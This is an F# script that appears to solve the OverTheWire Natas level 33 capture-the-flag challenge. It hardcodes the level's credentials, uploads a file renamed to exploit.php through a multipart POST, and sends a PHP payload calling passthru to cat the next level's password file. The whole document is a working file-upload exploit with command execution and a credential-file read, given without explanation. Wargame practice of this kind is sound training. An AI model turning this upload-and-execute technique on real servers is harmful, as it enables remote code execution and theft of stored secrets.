open System
open System.Net
open System.IO

let url = "http://natas33.natas.labs.overthewire.org/"
let credentials = "natas33:shoogeiGa2yee3de6Aex8uaXeech5eey"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let oracle fileContent =

    let boundary = "-----------------------------191691572411478"
    let body = 
        [
            "--" + boundary
            "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"firmware.exploit\""
            "Content-Type: text/plain"
            ""
            fileContent
            "--" + boundary
            "Content-Disposition: form-data; name=\"filename\""
            ""
            "exploit.php"
            "--" + boundary + "--"
        ] |> String.concat "\r\n"
    let bytes = body |> Seq.map byte |> Seq.toArray

    let http = HttpWebRequest.CreateHttp url
    http.Method <- "POST"
    http.ContentType <- "multipart/form-data; boundary=" + boundary

    http.Headers.Add(basicAuth)
    http.Headers.Add(sprintf "Content-Length: %i" bytes.Length)

    let request = http.GetRequestStream()
    request.Write(bytes, 0, bytes.Length)

    let response = http.GetResponse ()
    let stream = response.GetResponseStream ()
    let reader = new StreamReader (stream)
    reader.ReadToEnd ()

oracle "<?php passthru('cat /etc/natas_webpass/natas34'); ?>"
|> printfn "%s"